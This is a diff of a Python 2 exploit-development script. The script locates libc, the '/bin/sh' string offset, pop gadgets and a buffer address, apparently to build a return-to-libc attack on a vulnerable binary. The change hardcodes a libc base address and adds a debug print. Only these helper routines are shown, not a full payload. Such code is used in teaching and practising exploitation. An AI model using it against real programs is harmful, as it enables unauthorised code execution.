@@ -115,7 +115,6 @@ def find_library_base_addr(vuln_binary, library_path):
 
 def find_null_byte(vuln_bin, base_addr):
 
-    #print 'Binary = %s Base addr = 0x%x' %(vuln_bin, base_addr)
     cmd = "ldd "
     cmd = cmd + vuln_bin
     cmd = cmd + "|grep libc|awk '{print $3}'"
@@ -124,11 +123,10 @@ def find_null_byte(vuln_bin, base_addr):
     libc_path = proc.stdout.read()
 
     strings_command = "strings -t x " + libc_path[:-1] + "|grep /bin/sh|awk '{print $1}'"
-
     proc = subprocess.Popen(strings_command, shell=True, stdout=subprocess.PIPE)
     proc.wait()
     bin_sh_offset = int(proc.stdout.read(), 16)
-
+    
     null_byte_location = base_addr + bin_sh_offset + len("/bin/sh")
     return null_byte_location
 
@@ -389,15 +387,15 @@ if __name__ == '__main__':
             print 'Inconsistent entry in library structure !'
             exit(4)
 
-        result = find_null_byte(entry[3], entry[2])
+        result = find_null_byte(args.vuln_bin, 0xb7e05000)
         if result != None:
-            null_byte = result + entry[2]
+            null_byte = result 
             break
 
     if null_byte == None:
         print 'Unable to find gadget with 3 pops !'
         exit(4)
-
+    print 'NULL byte address = 0x%x' %(null_byte)
 
     buf_addr = find_buff_addr(args.vuln_bin)
     if buf_addr == None:
